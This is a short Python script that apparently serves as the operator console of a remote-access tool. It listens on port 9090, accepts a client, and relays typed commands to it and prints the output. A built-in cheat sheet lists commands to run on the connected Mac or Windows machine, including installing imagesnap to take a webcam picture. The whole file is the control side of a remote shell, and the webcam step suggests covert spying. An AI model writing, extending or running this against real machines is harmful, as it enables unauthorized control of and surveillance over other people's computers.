import socket

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = socket.gethostbyname(socket.gethostname())
port = 9090

server.bind((host, port))

print("Looking for Clients...")

server.listen(1)
client, addr = server.accept()

print(f"{addr} Connected to the server!")
print("""
      ==================================
                MAC:
                full name: id -F
                CPU info: sysctl -a | grep machdep.cpu
                open an application: open -a appname
                take picture from webcam:
                >brew install imagesnap
                >imagesnap -w 1 filename.png
      
                WINDOWS:
                name: whoami
                list fies in directory: dir
      """)

while True:
    command = input("Enter command: ")
    client.send(command.encode())
    print("sent")
    
    output = client.recv(1024).decode()
    print(f"Output:\n {output}")